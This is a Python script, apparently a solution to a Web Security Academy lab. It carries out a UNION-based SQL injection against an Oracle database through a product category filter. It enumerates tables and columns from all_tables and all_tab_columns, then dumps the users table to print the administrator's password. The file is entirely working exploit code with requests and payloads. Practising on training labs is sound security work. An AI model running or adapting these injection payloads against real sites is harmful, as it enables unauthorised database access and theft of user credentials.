import sys
import requests
from bs4 import BeautifulSoup
import re
from requests.adapters import HTTPAdapter, Retry



def find_users_table(url, session):
    try:
        response = session.get(f"{url}/filter?category=' UNION SELECT table_name, NULL FROM all_tables--", timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")
        users_table = soup.find(string=re.compile('^USERS_.*'))

        if users_table:
            return users_table
        else:
            print("(-) Something went wrong. Please check your URL and try again")
            sys.exit(1)

    except requests.exceptions.Timeout:
        print("(-) Request timed out.")
        sys.exit(1)

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")
        sys.exit(1)

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")
        sys.exit(1)


def get_column_names(url, session, users_table):
    response = session.get(f"{url}/filter?category=' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '{users_table}'--")
    soup = BeautifulSoup(response.text, 'html.parser')
    username_column = soup.find(string=re.compile('.*USERNAME.*'))
    password_column = soup.find(string=re.compile('.*PASSWORD.*'))
    return username_column, password_column


def get_admin_password(url, session, users_table, username_column, password_column):
    response = session.get(f"{url}/filter?category=' UNION select {username_column}, {password_column} from {users_table}--")
    soup = BeautifulSoup(response.text, 'html.parser')
    admin_password = soup.find(string="administrator").parent.findNext('td').contents[0]
    return admin_password


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)


    url = sys.argv[1].rstrip("/")
    session = requests.Session()
    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))

    users_table = find_users_table(url, session)
    print(f"(+) Users table: {users_table}")
    username_column, password_column = get_column_names(url, session, users_table)
    print(f"(+) Username column: {username_column}\n(+) Password column: {password_column}")
    admin_password = get_admin_password(url, session, users_table, username_column, password_column)
    print(f"(+) Administrator password: {admin_password}")


if __name__ == "__main__":
    main()

